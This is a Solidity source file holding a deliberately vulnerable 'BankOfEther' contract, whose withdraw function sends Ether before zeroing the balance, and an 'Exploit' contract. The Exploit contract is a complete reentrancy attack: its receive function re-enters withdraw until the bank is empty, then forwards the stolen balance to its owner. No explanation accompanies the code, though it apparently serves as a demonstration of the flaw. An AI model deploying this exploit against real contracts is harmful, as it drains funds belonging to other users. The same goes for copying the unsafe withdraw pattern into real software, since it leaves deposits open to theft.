// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "@openzeppelin/contracts/utils/Address.sol";

contract BankOfEther {
    using Address for address payable;

    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "Insufficient funds");
        payable(msg.sender).sendValue(balances[msg.sender]);
        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}


interface IBankOfEther {
    function deposit() external payable;
    function withdraw() external;
}

contract Exploit {
    IBankOfEther public immutable bankOfEther;
    address private owner;
    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    } 

    constructor(address bankOfEtherAddress) {
        bankOfEther = IBankOfEther(bankOfEtherAddress);
        owner = msg.sender;
    }

    function attack() external payable onlyOwner {
        bankOfEther.deposit{value: msg.value}();
        bankOfEther.withdraw();
    }

    receive() external payable {
        if (address(bankOfEther).balance > 0) {
            bankOfEther.withdraw();
        }
        else {
            payable(owner).transfer(address(this).balance);
        }
    }
}